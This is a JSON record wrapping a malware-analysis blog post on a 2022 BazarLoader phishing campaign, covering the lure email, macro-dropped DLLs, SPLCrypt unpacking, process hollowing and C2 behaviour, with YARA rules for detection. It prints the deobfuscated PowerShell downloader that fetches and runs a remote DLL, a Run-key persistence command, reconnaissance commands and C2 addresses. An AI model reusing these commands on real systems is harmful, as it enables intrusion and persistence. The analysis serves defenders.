{
    "id": "1a415127-73d5-45d9-bb54-370711a252d0",
    "created_at": "2023-01-12T15:03:52.291016Z",
    "updated_at": "2025-03-27T02:09:17.887164Z",
    "deleted_at": null,
    "sha1_hash": "94a9634fd7acf7aaa447123b3b23dc1ee7b64beb",
    "title": "2022-01-15 - BazarLoader - Back from Holiday Break",
    "authors": "",
    "file_creation_date": "2022-05-28T16:48:06Z",
    "file_modification_date": "2022-05-28T16:48:06Z",
    "file_size": 2304812,
    "plain_text": "# BazarLoader – Back From Holiday Break\n\n**malwarebookreports.com/bazarloader-back-from-holiday-break/**\n\nmuzi January 15, 2022\n\n### We recently observed a Bazarloader campaign at $dayjob, kicking off the return of maldoc campaigns after the holidays. This campaign piqued my interest after it hit on my SPLCrypt Yara rule that I wrote a while back, so I figured why not do a quick write-up and share that rule out. If there are any errors in this post, please feel free to reach out to me for corrections. I’m still learning!\n\n Update: I’d been meaning to come back and do a more thorough analysis of BazarLoader and finally got around to it. During that time, Eli Salem, a researcher that I follow and learn from, released a write up on BazarLoader. Though our articles share a lot of overlapping information (both articles are on samples from the same campaign), Eli goes into more detail than I do in several areas and I highly recommend reading Eli’s article.\n\n## Email with Link to Maldoc\n\n### The emails in this campaign were themed around participating in an interview and being awarded with a cash incentive for doing so. The emails requested that the user download a document with a password of 123 and answering the questions inside to participate. Below is a sample of the lure.\n```\nHi <Redacted>,\nOur client is looking to speak with professionals in the manufacturing and food production industries who have management\nresponsibility for employees or hygiene standards. \nThey are aiming to better understand the needs of people who are responsible for managing the day to day ongoing compliance of\nhygiene in these industries.\nI found you on LinkedIn and I think you're a good fit for this study.\nAn incentive of $250 will be paid to each participant for a 15-minute web interview. A bonus of $150 is also available for any\nsuccessful referrals from another organization.\nKindly answer the questions attached by link below (pass 123) if you want to participate and as to your relevance in this study.\nhxxps://1drv[.]ms/u/s!AqBUxnmcQ_BtblNHfJc4D_sZAh4?e=o4ejxJ\n\n## Maldoc with Macros\nFilename: ReadMe.doc\nMD5: dbd0bb79ea2465a02455edca624f9bc8\nSHA1: 96c58f2c78ae38302f8f20e9cb08837ea3149eeb\nSHA256: 2e367fcfc6583efad45bb8bbc97a77f30853d11322335d14d3d3d9ff4a79ea3c\n\n### The Word document has a simple lure requesting that the user click both “Enable Editing” and “Enable Content.” Once enabled, the malicious macro included in the document will kick off.\n\n Figure 1: Malicious Macro Runs on\n\n AutoOpen The macros embedded in the document are made to look like code to process credit cards. Buried in the VBA, a folder is created and two files are created and written to using #Print.\n\n```\n\n-----\n\n### Figure 2: Folder Creation\n\n Figure 3: 2 Files Created and Written To\n\n (1.png, 2.png) The two “png” files that are written are actually 32/64 bit DLL files that are then executed by the macro. The functionality of the two DLLs is identical: run a PowerShell script to download the next stage.\n\n## DLL/Powershell Downloader\n```\nFilename: 1.png\nMD5: 6dab9678f4ae6395b829ff53dace8432\nSHA1: fe7ee5ce4435fcc271ab976146e2e6d8f16fde78\nSHA256: 7076e5832b8c2a386e70de2612280f96b09062ec5402e18aee65fb46de9d50b4\nFilename: 2.png\nMD5: f31e276e3a50fdd8b800f649dcff19cf\nSHA1: f55b2b821d12eed29b02d73e519dfa6d12eee1a5\nSHA256: 9304089e076099451e8a7b8fe204986d6e762d939512f20877fc06ba69b4d42e\n\n### The DLLs written by the maldoc are simple downloaders that write a PowerShell script named errcheck.ps1 and execute it. The DLLs are not packed and simply running strings reveals the majority of the functionality of the downloaders.\n\n Figure 4: Name of .ps1 Written and\n\n Executed Figure 5: Command Executed\n\n to Run PS1 After running strings, a blob of base64 data can be found in the output. Once decoded, the contents of the malicious ps1 file are revealed.\nFilename: errcheck.ps1\nMD5: c352d68a4d6077a3a94c57aed16c139b\nSHA1: 107ba4ca7a9b1c102295e951a40bddfac0c5d28e\nSHA256: 9ca8609a1f3c9eeaa81205d7cad0a4747ffc358c07924ece6ed55ce21df2de33\n\n The PowerShell downloader is fairly simple but contains a fair amount of junk code to distract analysts and make it slightly annoying to read. Below is a small snippet showing an example of the junk code.\n\n Figure 6: Start-Process Call Hidden\n\n Amongst Junk Code Once the junk code is removed, it is quite clear what this code is trying to accomplish. It simply downloads the next stage DLL via BitsTransfer and executes it using Start-Process and rundll32.exe.\n\n```\n\n-----\n\n```\n$source = \"hxxp://nasikbazar[.]com/ldllrndlleaw64[.]png\"\nStart-Sleep -s 1\n$source2 = \"hxxp://nasikbazar[.]com/ldllrndlleaw64[.]png\"\n$mpath = \"c:\\.intel\\.rem\\.lang\\licne.txt\"\nif (Test-Path -Path $mpath){\nStart-Sleep -s 6\n}else{\nImport-Module bitstransfer;Start-BitsTransfer $source $mpath\n}\nif (Test-Path -Path $mpath){\nStart-Sleep -s 2\n}else{\nImport-Module bitstransfer;Start-BitsTransfer $source2 $mpath\n}\nStart-Sleep -s 6\nStart-Process -FilePath \"c:\\windows\\system32\\rundll32.exe\" -ArgumentList \"c:\\.intel\\.rem\\.lang\\licne.txt,        EproyAklW\"\n\n## BaZarLoader\n\n### BazarLoader is a small loader that is part of the Team9 malware family, developed by the same group behind Trickbot. The Team9 malware family was identified publicly in late April 2020 and has seen significant advances in development ever since.\n\n SPLCrypt\n\n The Team9 developers have a few crypters of choice and often rotate which crypter is used to pack their malware for each campaign. In this case, our BazarLoader sample was packed with SPLCrypt, a new crypter associated with BazarLoader. There’s very little information surrounding this particular crypter online, outside of a Yara rule that James Quinn of Binary Defense wrote. This rule is not public, so I have created my own Yara rule for this crypter which may be found at the end of this blog post.\nFilename: licne.txt\nMD5: 3e57f39950ee4368e0a15abea1133272\nSHA1: 7303d9dd5795a667a1aecf94dc252c8105aca95d\nSHA256: 62a7b273f763f92fd683d9248ae9ab7f5bc115b8c15e995291fdeb91d1aecc4b\n\n SPLCrypt consists of three key sections: RC4 Decryption, Decompression and Execution of the Payload. If following along, do not forget to set the new origin to the export “EproyAklw.”\n\n Figure 7: Set New Origin to EproyAklw\n\n#### RC4 Decryption\n\n### SPLCrypt first RC4 decrypts the BazarLoader payload, which is stored in two separate sections, combined and decrypted.\n\n```\n\n-----\n\n### Figure 8: RC4 Decrypt Function Call\n\n Figure 9: RC4 KSA (Key Scheduling\n\n Algorithm) Once the RC4 decryption of the ciphertext has finished, the decrypted data resembles a compressed MZ/PE header.\n\n Figure 10: Compressed MZ/PE Header\n\n#### Decompression\n\n### After the ciphertext has been RC4 decrypted, the decrypted data is then passed to a function to perform decompression.\n\n Figure 11: Decompression Function Call\n\n Once the decompression routine has completed, we’re left with the unpacked BazarLoader DLL.\n\n\n-----\n\n### Figure 12: Unpacked BazarLoader DLL\n\n (Preceded by |SPL|, hence the name SPLCrypt)\n#### Execution of Payload\n\n### Now that the payload has been decrypted and decompressed, SPLCrypt borrows some code from Metasploit. This shellcode dynamically resolves the addresses of a few functions, to be used to create a section of memory and reflectively load and execute the unpacked payload.\n\n Figure 13: Shellcode Resolving\n\n Functions Related to Execution of the Unpacked Malware Once the addresses of the necessary functions have been resolved, NtCreateSection is called to create a section of memory is created in preparation to reflectively load and execute the payload.\n\n Figure 14: NtCreateSection\n\n SECTION_ALL_ACCESS Next, the unpacked payload is copied into allocated memory and finally executed.\n\n\n-----\n\n### Figure 15: Unpacked Payload Copied\n\n into Allocated Memory Figure 16:\n\n VirtualProtect Setting Newly Allocated Memory to RWX (40) Finally, execution is transferred to the unpacked BazarLoader.\n\n Figure 17: Transfer Execution to\n\n Unpacked BazarLoader\n\n BazarLoader\n\n BazarLoader acts as an entry/staging point into a target network. BazarLoader is usually quickly followed up by BazarBackdoor, Cobalt Strike and then Ryuk Ransomware. The graphic below from Bleeping Computer shows this cycle.\n\n Figure 18: Typical Bazar Infection\n\n#### BAZARLOADER EXECUTION\n\n### BazarLoader uses dynamic API hashing to resolve APIs used within the malware. This technique makes static analysis slightly more difficult in that it dynamically resolves Windows API calls rather than statically linking them. BazarLoader makes use of the same hashing routine as Carberp. Typically, shortly after resolving a pointer to the desired API, BazarLoader calls the function.\n\n Figure 19: BazarLoader use same\n\n dynamic API hashing routine as seen in Carberp When Bazarloader is executed, it runs several commands similar to:\n```\ncmd /c choice /n /c y /d y /t 9 & \"C:\\Windows\\system32\\rundll32.exe\" \"C:\\Users\\Admin\\AppData\\Local\\Temp\\dumped_bazar.bin.dll\", #1\nYE4wU1wE UJzrG1wF & exit\n\n```\n\n-----\n\n### gu e 0 e ate Cu e t ocess and Start BazarLoader Again This command deletes the currently running process and starts BazarLoader again, this time with different arguments. Next, BazarLoader adds persistence in the form of a Run Key.\n```\ncmd.exe /c reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v Fv1ti2wN5mS4nG4tQ3U /t REG_SZ /d \n\"\\\"C:\\Windows\\system32\\rundll32.exe\\\" \\\"C:\\Users\\muzi\\AppData\\Local\\Temp\\licne.dll\\\", #1 YE4wU1wE UA60C1rC2 Bc8gZ6tw7wM0XT6\"\n\n Figure 21: BazarLoader Persistence via\n\n RunKey Figure 22: BazarLoader\n\n Persistence Once persistence has been established, BazarLoader searches for an injection target. BazarLoader targets svchost.exe, cmd.exe and explorer.exe, as well as IEXPLORE, MSEdge and Chrome.\n\n Figure 23: Querying for Installed Apps\n\n Figure 24: Chrome Identified\n\n Figure 25: Chrome.exe Injection Target\n\n Once a target has been identified, BazarLoader will execute this process in a suspended state, hollow it out and inject itself into it.\n\n Figure 26: CreateProcess in Suspended\n\n State Figure 27: Chrome Started in\n\n Suspended State Figure 28: Inject\n\n Malicious Code into Chrome\n\n```\n\n-----\n\n### a y, o ce jected, e ecut o s t a s e ed t esu e ead\n\n Figure 29: Resume Thread to Transfer\n\n Execution to Malicious Code Injected into Chrome After injecting itself into a hollowed-out process, BazarLoader sleeps for a short period. Next, it begins performing some connectivity checks to the following:\n\n yahoo.com google.com amazon.com microsoft.com msdn.microsoft.com live.com eset.com fortinet.com sky.com intel.com hp.com hpe.com apple.com vanguard.com whitehouse.gov\n\n Figure 30: Example of Domain Used for\n\n Connectivity Checks The domains above, the C2s below and many additional strings are decrypted by BazarLoader during runtime using routines similar to the following. Note: Similar routines are used to decrypt strings throughout BazarLoader, making it a prime target for a Yara rule.\n\n Figure 31: String Decryption Routine\n\n\n-----\n\n### O ce co ect ty as bee e ed, a a oade atte pt eso e t e o o g a dcoded C s\n\n 185[.]99[.]133[.]67 188[.]127[.]249[.]22 5[.]255[.]103[.]36 91[.]201[.]202[.]138 reddew28c[.]bazar bluehail[.]bazar whitestorm9p[.]bazar\n\n Figure 32: Bazar Domains in BazarLoader\n\n Sample If unsuccessful, BazarLoader will resolve DGA Emercoin domains.\n\n\n-----\n\n### Figure 33: Bazar DGA Algorithm\n\n BazarLoader Available COmmands\n\n BazarLoader serves as an entrypoint into a network. It supports several options to help profile the infected host, fetch and execute commands, return command output to server and finally download and execute BazarBackdoor.\n\n Figure 34: BazarLoader Command\n\n Options (Except Download and Run Backdoor)\n#### Send Telemetry\n\n### This command sends basic information about the infected host machine to the server.\n\n\n-----\n\n### Figure 35: Send Telemetry Command\n\n#### Get Command From Server\n\n### Get Command From Server does exactly what it says it does – it fetches commands from the C2 server and executes them. Here are some examples of commands sent from the C2 server:\n\n net group “domain admins” /dom net localgroup “administrator” nltest /domain_trusts /all_trusts net group “Domain Computers” /domain net view /all powershell -executionpolicy bypass -command “try { Get-WmiObject -Namespace ‘root\\SecurityCenter2’ -Query ‘SELECT displayName, pathToSignedProductExe FROM AntiVirusProduct’ -ErrorAction Stop } catch { Write-Host ” -NoNewline }” powershell -executionpolicy bypass -command “$path=’windowsdefender://’; if ($path -eq $null) { Write-Host ‘0’ } else { if (Test-Path ($path)) { write-host ([System.Diagnostics.FileVersionInfo]::GetVersionInfo($path).ProductVersion) } else { Write-Host ‘0’ } }” powershell -executionpolicy bypass -command “[email protected] (‘http://checkip.amazonaws.com’,’https://ipinfo.io/ip’,’http://api.ipify.org’,’https://myexternalip.com/raw’,’http://wtfismyip.com/text’,’http://ip.anysr format=text’,’http://api.ip.sb/ip’,’http://ident.me/ip’);$i=Get-Random -Minimum 0 -Maximum 8; <#Write-Host HTTP-DNS request via $Servers[$i];#>try { $ip=Invoke-WebRequest -UseBasicParsing -Uri $Servers[$i]; Write-Host $ip.content -NoNewline; }catch { <#Write- Error $_.Exception.Message;#> Write-Host ” -NoNewline; }” powershell -command “foreach ($p in (Get-WmiObject -Class Win32_Processor)) {Write-Host $p.Name}” powershell -command “foreach ($p in (Get-WmiObject -Class Win32_DiskDrive)) {Write-Host ([string]int+’GB, ‘+$p.Caption);}” powershell -command “(Get-WmiObject -Class ‘Win32_BaseBoard’).Manufacturer” powershell -command “((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory/1mb).tostring(‘F00’)”\n\n Figure 36: Get Command From Server\n\n Command\n#### Send Answer to Server\n\n### The Send Answer from Server command simply sends the output of the command executed from “Get Command From Server.”\n\n#### Download and Run Backdoor\n\n### This command attempts to download and run the BazarBackdoor for additional post-exploitation activity. Based on previous Conti activity, this typically leads to Cobalt Strike and eventually ransomware.\n\n Figure 37: BazarLoader Command to Download\n\n and Run BazarBackdoor\n\n## SPLCrypt Yara Rule\n\n\n-----\n\n### s a ays, p ease test t s u e you e o e t be o e us g ot espo s b e o caus g to s o a e ts o b ea g you tools/environment, due to inefficiency (which this rule is), False Positives, etc.! Again, special thanks to James Quinn of Binary Defense for providing the rule to abuse.ch and encouraged me to write this rule. Additional Yara rules I’ve written and included in my other blog posts can be found here.\n```\nrule SPLCrypt {\n  meta:\n    author = \"muzi\"\n    description = \"Identifies SPLCrypt, a crypter associated with Bazar.\"\n    date = \"01/16/22\"\n  strings:\n    // Implementation of ROR(x, 0x0D)\n    // (x << 0x13|x >> 0x0D) == ROR(x,0x0D)\n    /*\n    00007FFADADC4E37 | 8B0424          | mov eax,dword ptr ss:[rsp]       | hash\n     00007FFADADC4E3A | C1E8 0D         | shr eax,D                |\n     00007FFADADC4E3D | 66:3BFF         | cmp di,di                |\n     00007FFADADC4E40 | 74 4C          | je splcrypt_bazar.7FFADADC4E8E     |\n     */\n    $match_1_shr = {\n             (8B|8D) ?? 24 [0-8]              // mov <reg>, dword ptr ss:[rsp] hash\n             C1 (E8|E9|EA|EB|ED|EE|EF) 0D [0-16]      // shr <reg>, D\n             (E2|EB|72|74|75|7C) ??             // Conditional JMP\n    }\n    /*\n    00007FFADADC4E85 | 48:634424 04       | movsxd rax,dword ptr ss:[rsp+4]     | i\n     00007FFADADC4E8A | 3AFF           | cmp bh,bh                |\n     00007FFADADC4E8C | 74 DE          | je splcrypt_bazar.7FFADADC4E6C     |\n     00007FFADADC4E8E | 8B0C24          | mov ecx,dword ptr ss:[rsp]       |\n     00007FFADADC4E91 | C1E1 13         | shl ecx,13               |\n     00007FFADADC4E94 | E9 44FFFFFF       | jmp splcrypt_bazar.7FFADADC4DDD\n     */\n    $match_2_shl_13 = {\n              (8B|8D) ?? 24 [0-8]\n              C1 (E0|E1|E2|E3|E5|E6|E7) 13\n    }\n  condition:\n    #match_1_shr > 1 and #match_2_shl_13 > 1 and\n    for any i in (0..#match_1_shr):\n      ($match_2_shl_13 in (@match_1_shr[i][email protected]_1_shr[i]+200))\n}\n\n## SPLCrypt Unpacker\n\n### I wrote a small unpacker utilizing Speakeasy from Mandiant to dump out the decrypted/decompressed BazarLoader sample. I originally intended to do it without emulation, but was unable to determine which type of compression was being used.\n\n## BazarLoader Yara Rule\n\n### I haven’t tested this rule in a production environment, so just as I said with the rule above, use at your own risk. It’s also a bit non-performant.\n\n```\n\n-----\n\n```\n  meta:\n    author = \"muzi\"\n    description = \"Identifies BazarLoader.\"\n    date = \"02/18/22\"\n  strings:\n    /*\n   18000de19 c7 45 0b    MOV    dword ptr [RBP + local_54 ],0x3d9ffcdb\n        db fc 9f \n        3d\n   18000de20 c7 45 0f    MOV    dword ptr [RBP + local_50 ],0x61c9eecc\n        cc ee c9 \n        61\n   18000de27 c7 45 13    MOV    dword ptr [RBP + local_4c ],0x3899b7ca\n        ca b7 99 \n        38\n   18000de2e c7 45 17    MOV    dword ptr [RBP + local_48 ],0x5989f8d3\n        d3 f8 89 \n        59\n   18000de35 8b 45 0b    MOV    EAX,dword ptr [RBP + local_54 ]\n   18000de38 8a 45 07    MOV    AL,byte ptr [RBP + local_58 ]\n   18000de3b 84 c0      TEST    AL,AL\n   18000de3d 75 19      JNZ    LAB_18000de58\n   18000de3f 48 8b cb    MOV    param_1,RBX\n              LAB_18000de42                  XREF[1]:   18000de56 (j)  \n   18000de42 8b 44 8d    MOV    EAX,dword ptr [RBP + param_1 *0x4 + local_50 ]\n        0b\n   18000de46 35 a9 99    XOR    EAX,0x59fb99a9\n        fb 59\n    */\n    $xor_hash = {\n           C7 4? [2-4] ?? ?? ?? ??\n           C7 4? [2-4] ?? ?? ?? ?? [10-30]\n           35\n    }\n    /*\n   LAB_180012316                  XREF[1]:   1800122ca (j) \n   180012316 40 88 7c    MOV    byte ptr [RSP + local_1d0 ],DIL\n        24 78\n   18001231b ba e7 5f    MOV    param_2,0x1a705fe7\n        70 1a\n   180012320 c7 44 24    MOV    dword ptr [RSP + local_1cc ],0x72132994\n        7c 94 29\n        13 72\n   180012328 c7 45 80    MOV    dword ptr [RBP + local_1c8 ],0x34042c88\n        88 2c 04\n        34\n   18001232f c7 45 84    MOV    dword ptr [RBP + local_1c4 ],0x3a152782\n        82 27 15\n        3a\n   180012336 89 55 88    MOV    dword ptr [RBP + local_1c0 ],param_2\n   180012339 8b 44 24    MOV    EAX,dword ptr [RSP + local_1cc ]\n        7c\n   18001233d 8a 44 24    MOV    AL,byte ptr [RSP + local_1d0 ]\n        78\n   180012341 84 c0      TEST    AL,AL\n   180012343 75 16      JNZ    LAB_18001235b\n   180012345 48 8b cf    MOV    param_1,RDI\n              LAB_180012348                  XREF[1]:   180012359 (j) \n   180012348 8b 44 8c    MOV    EAX,dword ptr [RSP + param_1 *0x4 + local_1c8 ]\n        7c\n   18001234c 33 c2      XOR    EAX,param_2\n   */\n    $xor_reg = {\n         BA ?? ?? ?? ??\n         C7 4? [2-4] ?? ?? ?? ??\n         C7 4? [2-4] ?? ?? ?? ?? [10-30] \n         33 C2\n    } \n  condition:\n    uint16be(0) == 0x4D5A and    \n    #xor_hash > 5 and\n    #xor_reg > 5\n\n```\n\n-----\n\n```\n}\n\n## BazarLoader String Decryptor\n\n### I wanted to write a string decryptor for BazarLoader since doing it manually is a bit of a pain. Originally I was using Yara to extract the instruction sequences, but using a pure Python implementation was more effective and easier.\n\n```\n\n-----\n\n```\nt write data\nCryptdll.dll\nrundll32.exe\nGetFileAttributesExA\ncmd.exe /c reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v\nkernel32.dll\nbytearray(b'#`8)\\x7f\\x11.n+\\x12Y\\xbc\\xc4N_\\xb7')\nbytearray(b\"\\x9b\\'J\\xc6Q\\xb4f\\x98\\xa6\\xd3\\x10V\\xdd\\xc7\\x1ez\")\nbytearray(b'm\\x1d\\xd9R\\x8dU\\xe30G\\t\\x82\\x0cX\\x80/\\x88')\nbytearray(b'\\xbdl\\xc5^\\x1b\\xc06&\\x9dC\\xcf\\xb3v[\\xb6-')\nbytearray(b'\\xd7\\xe04>}d\\xe1\\x86\\x0f\\xbf\\xa8\\x08\\xdc\\x182P')\nbytearray(b'\\x1c\\xd6\\x8fK \\r\\x85I\\x15cx\\xa3\\xc1\\x19\\xb9\\x16')\nbytearray(b'\\xc3B\\xa2W\\x81Fi\\xa1\\x9eT\\x14\\xaf\\xd4\\xcd!t')\nbytearray(b'3\\xc2\\x02\\x8a;<\\x937uO\\xa9\\xad\\x05\\xde\\xae\\xe2')\nbytearray(b'\\x90k\\xb5\\xbeML\\xdb\\xa5\\xd2\\\\$\\x06?(s\\x1f')\nbytearray(b'\\x9a\\x91\\[email protected]\\xc9\\xd8a\\x95H\\xaboS\\x84')\nbytearray(b'\\x96|1\\x9c\\xc8\\x0b5\\x13A\\x9f\\xb89\\xceE{b')\nbytearray(b'\\x1a\\xac\\x8b\\x0e\\x17\\x94\"\\xa7,\\xd0e\\x97')\nBCryptFreeBuffer\nBCryptAddContextFunction\nTLS_ECDHE_ECDSA_\nTLS_RSA_WITH_AES_256_CBC_SHA\nTLS_RSA_WITH_AES_128_CBC_SHA\nadvapi32.dll\nl3dGr_uWs_p9m55s\n5.255.103.36\nregsvr32.exe\nsvchost.exe\nsvchost.exe\nkernel32.dll\nfortinet.com\nvanguard.com\nkernel32.dll\nkernel32.dll\nBCryptCreateHash\nBCryptFinishHash\nMIIEnwIBAAKCAQCs/Imfp7Sjqp2YPvDxQ+L5fKPfde3SazTkKYFzaVK72T5QNRitAU8yYoNj0rWkjDDs4cjn8dP8wzA0/CK+AqE09ZcNJXP1z6b+/b0oZhVMIwcXnzXd\nC1k2Lgooc0NeLiM7ZFFbj4v2x9SPkZCel0h/DhBJXeX8qJLdPDtdxNCTM6CPaxZwqZS0NI61DS4+9e2rX2Vy\n29OqoXtBN9fKFYHw+r4fedEDJxNa42r3E9vZpq457r9jteM=\nhardcoded IP\nUndefined\nBitDefender\nNortonSecurity\nWindowsDefender\n]. Error code = [\nCan't create file in path = [\n]. Error code = [\nMD5Update\nCreatePipe\nCreatePipe() return error\nPeekNamedPipe\nSet-Cookie:\n/nobreak\n/c y /d y /t\n127.0.0.1\n /t REG_SZ /d\nGetDateFormatA\nbcdfghklmnpqrstvwxz\nWs2_32.dll\ninet_pton\n95.217.229.211\n217.160.188.24\n89.163.140.67\n185.52.0.55\n195.10.195.195\nMozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)\nContent-Type: application/x-www-form-urlencoded\nBcrypt.dll\nBCryptEnumContextFunctions\nTLS_ECDHE_RSA_WITH_AES_256_CBC_SHA\nTLS_ECDHE_RSA_WITH_AES_128_CBC_SHA\nTLS_RSA_WITH_AES_256_GCM_SHA384\nTLS_RSA_WITH_AES_128_GCM_SHA256\nTLS_RSA_WITH_AES_256_CBC_SHA256\nTLS_RSA_WITH_AES_128_CBC_SHA256\nTLS_RSA_WITH_3DES_EDE_CBC_SHA\nuser32.dll\nws2_32.dll\nntdll.dll\nshell32.dll\nwininet.dll\nurlmon dll\n\n```\n\n-----\n\n```\nversion.dll\nole32.dll\na0lDGeEdIfO0g\nrFg6_9k8y_Sf_Gh6l7d\nlDF_2cSr_vT7e6r3s\nl1d00rG_sE3tFr1t_aGpJp\na09r4i67h\na0r3f45u7v\nf23k5p0r1m\nvSaDlRhBlEdMiRs\nrFg_7m3n0_sDv\nrDe6_mRa_9dSnFs\nrFeSg_4b5zKr_Qs4eDr\nrFgQtIr_b8aWz_Ki0\n185.99.133.67\n188.127.249.22\n91.201.202.138\nreddew28c.bazar\nbluehail.bazar\nwhitestorm9p.bazar\ncmd.exe /c reg.exe query HKCU\\Software\\\ncmd.exe /c reg.exe query HKCU\\Software\\\ncmd.exe /c reg.exe query HKCU\\Software\\\ncmd.exe /c reg.exe add HKCU\\Software\\\ncmd.exe /c reg.exe add HKCU\\Software\\\n /t REG_BINARY /d\ncmd.exe /c reg.exe add HKCU\\Software\\\n /t REG_BINARY /d\ncmd.exe /c reg.exe query\nchrome.exe\nmsedge.exe\nInternet Explorer\\\ncmd.exe /c reg.exe query\n\" /v \"Path\"\nInternet Explorer\\\nchrome.exe\nmsedge.exe\n SCODEF:17508 CREDAT:3\n --type=renderer --field-trial-handle=1140,\nchrome.exe\nmsedge.exe\n --instant-process --device-scale-factor=1\n --no-v8-untrusted-code-mitigations\n & start \"\" \"\n & start \"\" \"\nntdll.dll\nSetEnvironmentVariableA\n/absent0/offensive\ndownload and run backdoor\nyahoo.com\ngoogle.com\namazon.com\nmicrosoft.com\nmsdn.microsoft.com\nintel.com\napple.com\nwhitehouse.gov\nInitializeProcThreadAttributeList\nUpdateProcThreadAttribute\nntdll.dll\nNtGetContextThread\nNtSetContextThread\nNtResumeThread\nNtQueryInformationProcess\n(bytesMaskedProcess) is EMPTY\nDllRegisterServer\nGetDateFormatA\nGetTimeFormatA\nCrypt32.dll\nCryptDecodeObjectEx\nCryptDecodeObject\nBcrypt.dll\nBCryptGetProperty\nBCryptDestroyHash\nBCryptHashData\nBCryptSignHash\nBCryptImportKeyPair\nBCryptEncrypt\nBCryptDecrypt\n-----BEGIN RSA PRIVATE KEY-----END RSA PRIVATE KEY\nRSAFULLPRIVATEBLOB\n\n```\n\n-----\n\n```\nhardcoded Emercoin\ngenerate Emercoin\n\n### I wrote an additional string decryptor using Unicorn to see if that route would be more effective. It turns out it’s a little bit more difficult. It was still a fun exercise! Example output is below.\n\n```\n\n-----\n\n```\nundefined\n.)$L?)2 |{v7\\FV\nt cr\nhrror code = [\n&pdate\nCreatePipe\nPeekNamedPipe\n3Cookie:\nz6=iie:\n/nobreak\n> NUL\nchoice\n/c y /d y /t\n> NUL\nping\n127.0.0.1\n /t REG_SZ /d\nateFB\naeioqk\nWs2_32.dll\ninet_pton\nMozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)\nBcrypt.dll\nBCryptEnumContextFunctions\nTLS_ECDHE_RSA_WITH_AES_256_CBC_SHA\nTLS_ECDHE_RSA_WITH_AES_128_CBC_SHA\nTLS_RSA_WITH_AES_256_GCM_SHA384\nTLS_RSA_WITH_AES_128_GCM_SHA256\nTLS_RSA_WITH_AES_256\nTLS_RSA_WITH_AES_128_CBC_SHA256\nTLS_RSA_WITH_3DES_EDE_CBC_SHA\nuser32.d?\nws2_32.dll\nntdll.dll\nshell32.dll\nwininet.dll\nurlmon.dll\nshlwapi.dll\nversion.dll\nole32.dll\na0lDGeEdIfO0g\nrFg6_9k8y_Sf_Gh6l7d\nlDF_2cSr_vT7e6r3s\nl1d00rG_sE3tFr1t_aGpJp\na09r4i67h\na0r3l\nf23k5p0r1m\nvSaDlRhBlEdMiRs\nrFg_7m3n0_sDv\nrDe6_mRa_9dSnFs\nrFeSg_4b5zKr_Qs4eDr\nrFgQtIr_b8aWz_Ki0\n185.99.133.67\n188.127.249.22\n91.201.202.138\nreddew28c.bazar\nbluehail.bazar\nwhitestorm9p.bazar\nDexe /c reg.exe query HKCU\\Software\\\n3Ceexe /c reg.exe query HKCU\\Software\\\ncmd.exe /c reg.exe query HKCU\\Software\\\n /v \"\ncmd.exe /c reg.exe add HKCU\\Software\\\n /f /v\ncmd.exe /c reg.exe add HKCU\\Software\\\n /t REG_BINARY /d\n /f /v\ncmd.exe /c reg.exe add HKCU\\Software\\\n /t REG_BINARY /d\nexe\nzme.e\nrbexe\n \"Pa\nchrome.exe\nmsedge.exe\n SCODEF:17508 CREDAT:3\n --type=renderer --field-trial-handle=1140,\nchrome.exe\nPe-scale-factor=1 --num-raster-threads=2\nmsedge.exe\n --instant-process --device-scale-factor=1\n  no v8 untrusted code mitigations\n\n```\n\n-----\n\n```\nntdl\nnvironme\n7_;B}P7Q?W}P*Xn[Y1\n$IR{load and run backdoor\nyahoo.com\ngoogle.com\namazon.com\nmicrosoft.com\nmsdn.microsoft.com\nintel.com\nhp.com\nhpe.com\napple.com\nwhitehouse.gov\nInitializeProcThreadAttributeList\nntdll.dl\nNtGetContextThread\nNtSetContextThread\nNtResumeThread\n(byt\nGetDateFormatA\nGetTimeFormatA\nCrypt32.dll\nCryptDecodeObjectEx\nCryptDecodeObject\nBcrypt.dll\nBCryptGetProperty\nBCryptDestroyHash\nBCryptHashData\nBCryptSignHash\nBCryptImportKeyPair\nBCryptEncrypt\nBCryptDecrypt\n-----BEGIN RSA PRIVATE KEY-----END RSA PRIVATE KEYG\nRSAFULLPRIVATEBLOB\nBlockLength\nSHA384\nSHA384\nhardcoded Emercoin\ngenerate Emercoin\nGetFullPathNameA\nt write data\nyu+file\nyu+path = [\nZbtdll.dll\nrinal\n/ll32.exe\ntimeout\n192.0.2.\n-w 1000\nGetFileAttributesExA\n%public%\n@n\"Y\nEie:\nBCryptFreeBuffer\nBCryptAddContextFunction\nTLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA\nTLS_RSA_WITH_AES_256_CBC_SHA\nTLS_RSA_WITH_AES_128_CBC_SHA\n.dll\nadvapi32.dll\nnss3.dll\n_x64\nl3dGr_uWs_p9m55s\nm4s5c33p\na98h0i3s\na11m987w\n.exe\n5.255.103.36\n /f\n/vr32.exe\nsvch\nsvch/\nel32.dll\n|ll32\nlive.com(\neset.com\nfortinet.com\nvanguard.com\nkernel32 dll\n\n```\n\n-----\n\n```\nBCryptCreateHash\nBCryptFinishHash\nBCryptDestroyKey\nhardcoded IP\n\n### bazar bazarloader maldoc splcrypt\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-01-15 - BazarLoader - Back from Holiday Break.pdf"
    ],
    "report_names": [
        "2022-01-15 - BazarLoader - Back from Holiday Break.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
